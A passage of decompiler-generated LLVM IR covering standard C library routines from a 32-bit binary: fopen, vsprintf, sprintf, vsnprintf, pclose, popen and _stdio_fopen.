  uselistorder label %dec_label_pc_8050583, { 1, 0 }
  uselistorder label %dec_label_pc_805056f, { 1, 0 }
  uselistorder label %dec_label_pc_80504f6, { 1, 0 }
  uselistorder label %dec_label_pc_80504e1, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_80505cf = inttoptr i32 %arg2 to i8*
  %v5_80505cf = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_80505cf, i32 0, i32 -1)
  ret i32 %v5_80505cf
}

define i32 @vsprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80505e9 = inttoptr i32 %arg1 to i8*
  %v5_80505e9 = call i32 @__GI_vsnprintf(i8* %v4_80505e9, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_80505e9
}

define i32 @sprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_80505f7 = ptrtoint i32* %stack_var_12 to i32
  %v4_805060a = inttoptr i32 %arg1 to i8*
  %v5_805060a = call i32 @__GI_vsnprintf(i8* %v4_805060a, i32 -1, i32 %arg2, i32 %v2_80505f7)
  ret i32 %v5_805060a
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050614 = load i32, i32* @ebp, align 4
  %v0_8050615 = load i32, i32* @edi, align 4
  %v0_8050616 = load i32, i32* @esi, align 4
  %v0_8050617 = load i32, i32* @ebx, align 4
  store i32 %v0_8050617, i32* %stack_var_-16, align 4
  %v4_805061b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805061b, i32* @esi, align 4
  %v2_805061f = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_805062a = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_805062a, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_8050644 = sub i32 -1, %v4_805061b
  %v1_8050657 = call i32 @__stdio_init_mutex(i32 %v2_805061f)
  %v1_8050667 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_8050644, %v1_8050667
  %v5_8050669 = select i1 %tmp, i32 %v1_8050644, i32 %v1_8050667
  store i32 %v5_8050669, i32* @ebx, align 4
  %v0_805066c = load i32, i32* @esi, align 4
  %v3_8050696 = inttoptr i32 %arg3 to i8*
  %v4_8050696 = call i32 @_vfprintf_internal(i32 %v2_805062a, i8* %v3_8050696, i32 %arg4)
  %v1_805069e = icmp eq i32 %v5_8050669, 0
  store i32 %v4_8050696, i32* @edx, align 4
  br i1 %v1_805069e, label %dec_label_pc_80506ba, label %dec_label_pc_80506b3

dec_label_pc_80506b3:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_805066c to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_80506bd.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80506ba

dec_label_pc_80506ba:                             ; preds = %entry, %dec_label_pc_80506b3
  %v0_80506bd = phi i32 [ %v4_8050696, %entry ], [ %v0_80506bd.pre, %dec_label_pc_80506b3 ]
  %v2_80506bf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80506bf, i32* @ebx, align 4
  store i32 %v0_8050616, i32* @esi, align 4
  store i32 %v0_8050615, i32* @edi, align 4
  store i32 %v0_8050614, i32* @ebp, align 4
  ret i32 %v0_80506bd

; uselistorder directives
  uselistorder i32 %v1_8050667, { 1, 0 }
  uselistorder i32 %v1_8050644, { 1, 0 }
  uselistorder label %dec_label_pc_80506ba, { 1, 0 }
}

define i32 @pclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80506c4 = load i32, i32* @edi, align 4
  %v0_80506c6 = load i32, i32* @ebx, align 4
  store i32 %v0_80506c6, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_80506d8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80506d8, i32* %stack_var_-60, align 4
  %v4_80506dd = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8065400.206 to i32))
  store i32 ptrtoint (i32* @global_var_8065400.206 to i32), i32* %stack_var_-60, align 4
  %v1_80506e9 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065400.206 to i32))
  %v0_80506ee = load i32, i32* @global_var_8065418.207, align 8
  store i32 %v0_80506ee, i32* @ebx, align 4
  %v1_80506f7 = icmp eq i32 %v0_80506ee, 0
  br i1 %v1_80506f7, label %dec_label_pc_805072d, label %dec_label_pc_80506fb

dec_label_pc_80506fb:                             ; preds = %entry
  %v1_80506fb = add i32 %v0_80506ee, 4
  %v2_80506fb = inttoptr i32 %v1_80506fb to i32*
  %v3_80506fb = load i32, i32* %v2_80506fb, align 4
  %v4_80506fb = load i32, i32* @edi, align 4
  %v15_80506fb = icmp eq i32 %v3_80506fb, %v4_80506fb
  %v1_80506fe = icmp eq i1 %v15_80506fb, false
  br i1 %v1_80506fe, label %dec_label_pc_805071c, label %dec_label_pc_8050700

dec_label_pc_8050700:                             ; preds = %dec_label_pc_80506fb
  %v1_8050700 = inttoptr i32 %v0_80506ee to i32*
  %v2_8050700 = load i32, i32* %v1_8050700, align 4
  store i32 %v2_8050700, i32* @global_var_8065418.207, align 8
  br label %dec_label_pc_805072d

dec_label_pc_8050709:                             ; preds = %dec_label_pc_805071c
  %v0_8050709 = load i32, i32* %stack_var_-60, align 4
  %v1_8050709 = call i32 @__errno_location(i32 %v0_8050709)
  %v1_805070e = inttoptr i32 %v1_8050709 to i32*
  store i32 22, i32* %v1_805070e, align 4
  br label %dec_label_pc_805072d

dec_label_pc_8050716:                             ; preds = %dec_label_pc_8050759
  %v3_8050716 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_805077b

dec_label_pc_805071c:                             ; preds = %dec_label_pc_80506fb, %dec_label_pc_8050724
  %v1_805072b = phi i32 [ %v2_805071e, %dec_label_pc_8050724 ], [ %v0_80506ee, %dec_label_pc_80506fb ]
  %v1_805071e = inttoptr i32 %v1_805072b to i32*
  %v2_805071e = load i32, i32* %v1_805071e, align 4
  store i32 %v2_805071e, i32* @ebx, align 4
  %v1_8050720 = icmp eq i32 %v2_805071e, 0
  br i1 %v1_8050720, label %dec_label_pc_8050709, label %dec_label_pc_8050724

dec_label_pc_8050724:                             ; preds = %dec_label_pc_805071c
  %v1_8050724 = add i32 %v2_805071e, 4
  %v2_8050724 = inttoptr i32 %v1_8050724 to i32*
  %v3_8050724 = load i32, i32* %v2_8050724, align 4
  %v15_8050724 = icmp eq i32 %v3_8050724, %v4_80506fb
  %v1_8050727 = icmp eq i1 %v15_8050724, false
  br i1 %v1_8050727, label %dec_label_pc_805071c, label %dec_label_pc_8050729

dec_label_pc_8050729:                             ; preds = %dec_label_pc_8050724
  %v1_8050729 = inttoptr i32 %v2_805071e to i32*
  %v2_8050729 = load i32, i32* %v1_8050729, align 4
  store i32 %v2_8050729, i32* %v1_805071e, align 4
  br label %dec_label_pc_805072d

dec_label_pc_805072d:                             ; preds = %entry, %dec_label_pc_8050709, %dec_label_pc_8050700, %dec_label_pc_8050729
  store i32 %v2_80506d8, i32* %stack_var_-60, align 4
  %v3_8050736 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v0_805073e = load i32, i32* @ebx, align 4
  %v1_805073e = icmp eq i32 %v0_805073e, 0
  br i1 %v1_805073e, label %dec_label_pc_8050778, label %dec_label_pc_8050742

dec_label_pc_8050742:                             ; preds = %dec_label_pc_805072d
  %v1_8050745 = add i32 %v0_805073e, 8
  %v2_8050745 = inttoptr i32 %v1_8050745 to i32*
  %v3_8050745 = load i32, i32* %v2_8050745, align 4
  store i32 %v3_8050745, i32* @esi, align 4
  store i32 %v0_805073e, i32* %stack_var_-60, align 4
  %v1_8050749 = call i32 @free(i32 %v0_805073e)
  %v0_805074e = load i32, i32* @edi, align 4
  store i32 %v0_805074e, i32* %stack_var_-60, align 4
  %v1_8050751 = inttoptr i32 %v0_805074e to i16*
  %v2_8050751 = call i32 @__GI_fclose(i16* %v1_8050751)
  %v2_805075c = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_8050759

dec_label_pc_8050759:                             ; preds = %dec_label_pc_805076e, %dec_label_pc_8050742
  %v0_8050761 = load i32, i32* @esi, align 4
  store i32 %v0_8050761, i32* %stack_var_-60, align 4
  %v3_8050762 = call i32 @waitpid(i32 %v0_8050761, i32 %v2_805075c, i32 0)
  %v2_805076a = icmp slt i32 %v3_8050762, 0
  %v1_805076c = icmp eq i1 %v2_805076a, false
  br i1 %v1_805076c, label %dec_label_pc_8050716, label %dec_label_pc_805076e

dec_label_pc_805076e:                             ; preds = %dec_label_pc_8050759
  %v0_805076e = load i32, i32* %stack_var_-60, align 4
  %v1_805076e = call i32 @__errno_location(i32 %v0_805076e)
  %v1_8050773 = inttoptr i32 %v1_805076e to i32*
  %v2_8050773 = load i32, i32* %v1_8050773, align 4
  %v11_8050773 = icmp eq i32 %v2_8050773, 4
  br i1 %v11_8050773, label %dec_label_pc_8050759, label %dec_label_pc_8050778.loopexit

dec_label_pc_8050778.loopexit:                    ; preds = %dec_label_pc_805076e
  br label %dec_label_pc_8050778

dec_label_pc_8050778:                             ; preds = %dec_label_pc_8050778.loopexit, %dec_label_pc_805072d
  br label %dec_label_pc_805077b

dec_label_pc_805077b:                             ; preds = %dec_label_pc_8050716, %dec_label_pc_8050778
  %storemerge = phi i32 [ -1, %dec_label_pc_8050778 ], [ %v3_8050716, %dec_label_pc_8050716 ]
  %v2_805077e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805077e, i32* @ebx, align 4
  store i32 %v0_80506c4, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_805073e, { 2, 1, 0, 3 }
  uselistorder i32 %v2_805071e, { 0, 2, 3, 4, 1 }
  uselistorder i32* %stack_var_-60, { 0, 2, 3, 4, 5, 1, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @waitpid, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_805077b, { 1, 0 }
  uselistorder label %dec_label_pc_805072d, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805071c, { 1, 0 }
}

define i32 @popen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050782 = load i32, i32* @esi, align 4
  %v0_8050783 = load i32, i32* @ebx, align 4
  store i32 %v0_8050783, i32* %stack_var_-8, align 4
  %v15_8050784 = ptrtoint i32* %stack_var_-60 to i32
  %v4_8050787 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8050787, i32* @ebx, align 4
  %v2_805078b = load i8, i8* %arg2, align 1
  %v3_805078b = zext i8 %v2_805078b to i32
  %v4_805078b = load i32, i32* @eax, align 4
  %v5_805078b = and i32 %v4_805078b, -256
  %v6_805078b = or i32 %v5_805078b, %v3_805078b
  store i32 %v6_805078b, i32* %eax.global-to-local, align 4
  %v10_805078d = icmp eq i8 %v2_805078b, 119
  br i1 %v10_805078d, label %dec_label_pc_80507bc, label %dec_label_pc_8050791

dec_label_pc_8050791:                             ; preds = %entry
  %v10_8050791 = icmp eq i8 %v2_805078b, 114
  br i1 %v10_8050791, label %dec_label_pc_80507bc, label %dec_label_pc_805079d

dec_label_pc_805079d:                             ; preds = %dec_label_pc_8050791
  %v1_805079d = call i32 @__errno_location(i32 1)
  store i32 %v1_805079d, i32* %eax.global-to-local, align 4
  %v1_80507a2 = inttoptr i32 %v1_805079d to i32*
  store i32 22, i32* %v1_80507a2, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_8050973

dec_label_pc_80507bc:                             ; preds = %entry, %dec_label_pc_8050791
  %v0_805088a = phi i32 [ 1, %dec_label_pc_8050791 ], [ 0, %entry ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_80507c1 = call i32 @malloc(i32 12)
  store i32 %v1_80507c1, i32* %eax.global-to-local, align 4
  %v1_80507cd = icmp eq i32 %v1_80507c1, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_80507cd, label %dec_label_pc_8050973, label %dec_label_pc_80507dc

dec_label_pc_80507dc:                             ; preds = %dec_label_pc_80507bc
  %v2_80507df = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_80507df, i32* %eax.global-to-local, align 4
  store i32 %v2_80507df, i32* %stack_var_-76, align 4
  %v1_80507e4 = call i32 @__GI_pipe(i32 %v2_80507df)
  store i32 %v1_80507e4, i32* %eax.global-to-local, align 4
  %v1_80507ec = icmp eq i32 %v1_80507e4, 0
  %v1_80507ee = icmp eq i1 %v1_80507ec, false
  br i1 %v1_80507ee, label %dec_label_pc_805095c, label %dec_label_pc_80507f4

dec_label_pc_80507f4:                             ; preds = %dec_label_pc_80507dc
  store i32 %v0_805088a, i32* %eax.global-to-local, align 4
  %tmp38 = sub nsw i32 0, %v0_805088a
  %v2_80507f8 = and i32 %tmp38, 4
  %v3_80507f8 = add i32 %v15_8050784, 44
  %v4_80507f8 = add i32 %v3_80507f8, %v2_80507f8
  %v5_80507f8 = inttoptr i32 %v4_80507f8 to i32*
  %v6_80507f8 = load i32, i32* %v5_80507f8, align 4
  %v5_8050805 = xor i32 %v0_805088a, 1
  store i32 %v5_8050805, i32* %eax.global-to-local, align 4
  %tmp39 = sub nsw i32 0, %v5_8050805
  %v2_8050809 = and i32 %tmp39, 4
  %v4_8050809 = add i32 %v3_80507f8, %v2_8050809
  %v5_8050809 = inttoptr i32 %v4_8050809 to i32*
  %v6_8050809 = load i32, i32* %v5_8050809, align 4
  store i32 %v6_8050809, i32* %eax.global-to-local, align 4
  %v0_8050811 = load i32, i32* @ecx, align 4
  %v0_8050813 = load i32, i32* @ebx, align 4
  %v5_8050813 = inttoptr i32 %v0_8050813 to i8*
  store i8* %v5_8050813, i8** %stack_var_-72, align 4
  store i32 %v6_8050809, i32* %stack_var_-76, align 4
  %v5_8050815 = call i32 @fdopen(i32 %v6_8050809, i32 %v0_8050813, i32 %v0_8050811, i32 %v0_8050811)
  store i32 %v5_8050815, i32* %eax.global-to-local, align 4
  store i32 %v5_8050815, i32* %stack_var_-60, align 4
  %v1_8050821 = icmp eq i32 %v5_8050815, 0
  %v1_8050823 = icmp eq i1 %v1_8050821, false
  br i1 %v1_8050823, label %dec_label_pc_8050840, label %dec_label_pc_8050825

dec_label_pc_8050825:                             ; preds = %dec_label_pc_80507f4
  store i32 %v6_8050809, i32* %stack_var_-76, align 4
  %v1_805082c = call i32 @__libc_close(i32 %v6_8050809)
  store i32 %v1_805082c, i32* %eax.global-to-local, align 4
  %v2_8050831 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050831, i32* %edx.global-to-local, align 4
  store i32 %v6_80507f8, i32* %stack_var_-76, align 4
  %v1_8050836 = call i32 @__libc_close(i32 %v6_80507f8)
  br label %dec_label_pc_8050959

dec_label_pc_8050840:                             ; preds = %dec_label_pc_80507f4
  store i8* inttoptr (i32 134541533 to i8*), i8** %stack_var_-72, align 4
  %v2_805084b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805084b, i32* %eax.global-to-local, align 4
  store i32 %v2_805084b, i32* %stack_var_-76, align 4
  %v5_8050850 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8065400.206 to i32))
  store i32 %v5_8050850, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8065400.206 to i32), i32* %stack_var_-76, align 4
  %v1_805085c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065400.206 to i32))
  store i32 %v1_805085c, i32* %eax.global-to-local, align 4
  %v0_8050861 = load i32, i32* %stack_var_-76, align 4
  %v1_8050861 = call i32 @__vfork(i32 %v0_8050861)
  store i32 %v1_8050861, i32* %eax.global-to-local, align 4
  %v1_8050869 = icmp eq i32 %v1_8050861, 0
  store i32 %v1_8050861, i32* @ebx, align 4
  %v1_805086d = icmp eq i1 %v1_8050869, false
  br i1 %v1_805086d, label %dec_label_pc_80508e7, label %dec_label_pc_805086f

dec_label_pc_805086f:                             ; preds = %dec_label_pc_8050840
  store i32 %v6_8050809, i32* %stack_var_-76, align 4
  %v1_8050876 = call i32 @__libc_close(i32 %v6_8050809)
  store i32 %v1_8050876, i32* %eax.global-to-local, align 4
  store i32 %v0_805088a, i32* %edx.global-to-local, align 4
  %v15_8050882 = icmp eq i32 %v6_80507f8, %v0_805088a
  br i1 %v15_8050882, label %dec_label_pc_80508a1, label %dec_label_pc_8050888

dec_label_pc_8050888:                             ; preds = %dec_label_pc_805086f
  %v5_805088a = inttoptr i32 %v0_805088a to i8*
  store i8* %v5_805088a, i8** %stack_var_-72, align 4
  store i32 %v6_80507f8, i32* %stack_var_-76, align 4
  %v5_805088f = call i32 @dup2(i32 %v6_80507f8, i32 %v0_805088a, i32 %v1_8050876, i32 %v1_8050876)
  %v2_8050894 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_8050894, i32* %eax.global-to-local, align 4
  store i32 %v6_80507f8, i32* %stack_var_-76, align 4
  %v1_8050899 = call i32 @__libc_close(i32 %v6_80507f8)
  store i32 %v1_8050899, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508a1

dec_label_pc_80508a1:                             ; preds = %dec_label_pc_805086f, %dec_label_pc_8050888
  %v0_80508a1 = load i32, i32* @global_var_8065418.207, align 8
  store i32 %v0_80508a1, i32* @ebx, align 4
  %v1_80508bc3 = icmp eq i32 %v0_80508a1, 0
  %v1_80508be10 = icmp eq i1 %v1_80508bc3, false
  br i1 %v1_80508be10, label %dec_label_pc_80508a9, label %dec_label_pc_80508c0

dec_label_pc_80508a9:                             ; preds = %dec_label_pc_80508a1, %dec_label_pc_80508a9
  %v0_80508a9 = phi i32 [ %v2_80508b7, %dec_label_pc_80508a9 ], [ %v0_80508a1, %dec_label_pc_80508a1 ]
  %v1_80508a9 = add i32 %v0_80508a9, 4
  %v2_80508a9 = inttoptr i32 %v1_80508a9 to i32*
  %v3_80508a9 = load i32, i32* %v2_80508a9, align 4
  store i32 %v3_80508a9, i32* %eax.global-to-local, align 4
  %v1_80508af = add i32 %v3_80508a9, 4
  %v2_80508af = inttoptr i32 %v1_80508af to i32*
  %v3_80508af = load i32, i32* %v2_80508af, align 4
  store i32 %v3_80508af, i32* %stack_var_-76, align 4
  %v1_80508b2 = call i32 @__libc_close(i32 %v3_80508af)
  store i32 %v1_80508b2, i32* %eax.global-to-local, align 4
  %v0_80508b7 = load i32, i32* @ebx, align 4
  %v1_80508b7 = inttoptr i32 %v0_80508b7 to i32*
  %v2_80508b7 = load i32, i32* %v1_80508b7, align 4
  store i32 %v2_80508b7, i32* @ebx, align 4
  %v1_80508bc = icmp eq i32 %v2_80508b7, 0
  %v1_80508be = icmp eq i1 %v1_80508bc, false
  br i1 %v1_80508be, label %dec_label_pc_80508a9, label %dec_label_pc_80508c0

dec_label_pc_80508c0:                             ; preds = %dec_label_pc_80508a9, %dec_label_pc_80508a1
  store i32 0, i32* %stack_var_-76, align 4
  %v8_80508d8 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805b8a3.210 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b8a8.209 to i32), i32 ptrtoint ([3 x i8]* @global_var_805b8a0.208 to i32), i32 %arg1, i32 0)
  store i32 %v8_80508d8, i32* %eax.global-to-local, align 4
  store i32 127, i32* %stack_var_-76, align 4
  %v1_80508e2 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80508e7:                             ; preds = %dec_label_pc_8050840
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805084b, i32* %stack_var_-76, align 4
  %v4_80508f0 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  %v2_80508f5 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_80508f5, i32* %eax.global-to-local, align 4
  store i32 %v6_80507f8, i32* %stack_var_-76, align 4
  %v1_80508fa = call i32 @__libc_close(i32 %v6_80507f8)
  store i32 %v1_80508fa, i32* %eax.global-to-local, align 4
  %v0_8050902 = load i32, i32* @ebx, align 4
  %tmp41 = icmp slt i32 %v0_8050902, 1
  br i1 %tmp41, label %dec_label_pc_805094d, label %dec_label_pc_8050906

dec_label_pc_8050906:                             ; preds = %dec_label_pc_80508e7
  store i32 %v1_80507c1, i32* %eax.global-to-local, align 4
  %v2_805090a = add i32 %v1_80507c1, 8
  %v3_805090a = inttoptr i32 %v2_805090a to i32*
  store i32 %v0_8050902, i32* %v3_805090a, align 4
  %v2_805090d = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_805090d, i32* %edx.global-to-local, align 4
  %v1_8050910 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050910 = add i32 %v1_8050910, 4
  %v3_8050910 = inttoptr i32 %v2_8050910 to i32*
  store i32 %v2_805090d, i32* %v3_8050910, align 4
  store i8* inttoptr (i32 134541533 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805084b, i32* %stack_var_-76, align 4
  %v5_805091f = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134541533, i32 ptrtoint (i32* @global_var_8065400.206 to i32))
  store i32 %v5_805091f, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8065400.206 to i32), i32* %stack_var_-76, align 4
  %v1_805092b = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8065400.206 to i32))
  store i32 %v1_80507c1, i32* %edx.global-to-local, align 4
  %v0_8050934 = load i32, i32* @global_var_8065418.207, align 8
  store i32 %v0_8050934, i32* %eax.global-to-local, align 4
  %v2_8050939 = inttoptr i32 %v1_80507c1 to i32*
  store i32 %v0_8050934, i32* %v2_8050939, align 4
  %v2_805093b = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805093b, i32* @ecx, align 4
  %v0_805093c = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805093c, i32* @global_var_8065418.207, align 8
  %v2_8050942 = load i8*, i8** %stack_var_-72, align 4
  %v3_8050942 = ptrtoint i8* %v2_8050942 to i32
  store i32 %v3_8050942, i32* @ebx, align 4
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-72, align 4
  store i32 %v2_805084b, i32* %stack_var_-76, align 4
  %v4_8050946 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v4_8050946, i32* %eax.global-to-local, align 4
  %v2_8050973.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_8050970

dec_label_pc_805094d:                             ; preds = %dec_label_pc_80508e7
  %v3_8050950 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_8050950, i32* %stack_var_-76, align 4
  %v1_8050954 = inttoptr i32 %v3_8050950 to i16*
  %v2_8050954 = call i32 @__GI_fclose(i16* %v1_8050954)
  br label %dec_label_pc_8050959

dec_label_pc_8050959:                             ; preds = %dec_label_pc_8050825, %dec_label_pc_805094d
  %storemerge = phi i32 [ %v2_8050954, %dec_label_pc_805094d ], [ %v1_8050836, %dec_label_pc_8050825 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805095c

dec_label_pc_805095c:                             ; preds = %dec_label_pc_80507dc, %dec_label_pc_8050959
  store i32 %v1_80507c1, i32* %stack_var_-76, align 4
  %v1_8050963 = call i32 @free(i32 %v1_80507c1)
  store i32 %v1_8050963, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_8050970

dec_label_pc_8050970:                             ; preds = %dec_label_pc_8050906, %dec_label_pc_805095c
  %v2_8050973.pre = phi i32 [ %v2_8050973.pre.pre, %dec_label_pc_8050906 ], [ 0, %dec_label_pc_805095c ]
  br label %dec_label_pc_8050973

dec_label_pc_8050973:                             ; preds = %dec_label_pc_80507bc, %dec_label_pc_805079d, %dec_label_pc_8050970
  %v2_8050973 = phi i32 [ 0, %dec_label_pc_80507bc ], [ 0, %dec_label_pc_805079d ], [ %v2_8050973.pre, %dec_label_pc_8050970 ]
  store i32 %v2_8050973, i32* %eax.global-to-local, align 4
  %v2_8050979 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050979, i32* @ebx, align 4
  store i32 %v0_8050782, i32* @esi, align 4
  ret i32 %v2_8050973

; uselistorder directives
  uselistorder i32 %v2_8050973, { 1, 0 }
  uselistorder i32 %v0_8050902, { 1, 0 }
  uselistorder i32 %v2_80508b7, { 1, 2, 0 }
  uselistorder i32 %v6_8050809, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v6_80507f8, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_80507df, { 1, 0, 2 }
  uselistorder i32 %v1_80507c1, { 5, 4, 1, 0, 3, 2, 6, 7 }
  uselistorder i32 %v0_805088a, { 2, 1, 0, 5, 3, 4, 6 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i8** %stack_var_-72, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 ptrtoint (i32* @global_var_8065400.206 to i32), { 3, 6, 2, 4, 7, 0, 5, 8, 1 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050973, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050970, { 1, 0 }
  uselistorder label %dec_label_pc_805095c, { 1, 0 }
  uselistorder label %dec_label_pc_8050959, { 1, 0 }
  uselistorder label %dec_label_pc_80508a9, { 1, 0 }
  uselistorder label %dec_label_pc_80508a1, { 1, 0 }
  uselistorder label %dec_label_pc_80507bc, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805097c = load i32, i32* @ebp, align 4
  %v0_805097d = load i32, i32* @edi, align 4
  %v0_805097e = load i32, i32* @esi, align 4
  %v0_805097f = load i32, i32* @ebx, align 4
  store i32 %v0_805097f, i32* %stack_var_-16, align 4
  %v4_8050983 = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_8050993 = load i8, i8* %arg2, align 1
  %v3_8050993 = zext i8 %v2_8050993 to i32
  %v4_8050993 = load i32, i32* @eax, align 4
  %v5_8050993 = and i32 %v4_8050993, -256
  %v6_8050993 = or i32 %v5_8050993, %v3_8050993
  store i32 %v6_8050993, i32* %eax.global-to-local, align 4
  %v10_8050995 = icmp eq i8 %v2_8050993, 114
  br i1 %v10_8050995, label %dec_label_pc_80509d7, label %dec_label_pc_8050999

dec_label_pc_8050999:                             ; preds = %entry
  %v10_8050999 = icmp eq i8 %v2_8050993, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_8050999, label %dec_label_pc_80509d9, label %dec_label_pc_80509a2

dec_label_pc_80509a2:                             ; preds = %dec_label_pc_8050999
  %v10_80509a2 = icmp eq i8 %v2_8050993, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_80509a2, label %dec_label_pc_80509d9, label %dec_label_pc_80509aa

dec_label_pc_80509aa:                             ; preds = %dec_label_pc_8050a52, %dec_label_pc_8050a2c, %dec_label_pc_80509a2
  %v0_80509aa = load i32, i32* %stack_var_-16, align 4
  %v1_80509aa = call i32 @__errno_location(i32 %v0_80509aa)
  store i32 %v1_80509aa, i32* %eax.global-to-local, align 4
  %v0_80509af = load i32, i32* @ebp, align 4
  %v1_80509af = icmp eq i32 %v0_80509af, 0
  %v1_80509b1 = inttoptr i32 %v1_80509aa to i32*
  store i32 22, i32* %v1_80509b1, align 4
  br i1 %v1_80509af, label %dec_label_pc_8050bb3, label %dec_label_pc_80509bd

dec_label_pc_80509bd:                             ; preds = %dec_label_pc_8050a75, %dec_label_pc_80509aa
  %v0_80509bd = load i32, i32* @ebp, align 4
  %v1_80509bd = add i32 %v0_80509bd, 1
  %v2_80509bd = inttoptr i32 %v1_80509bd to i8*
  %v3_80509bd = load i8, i8* %v2_80509bd, align 1
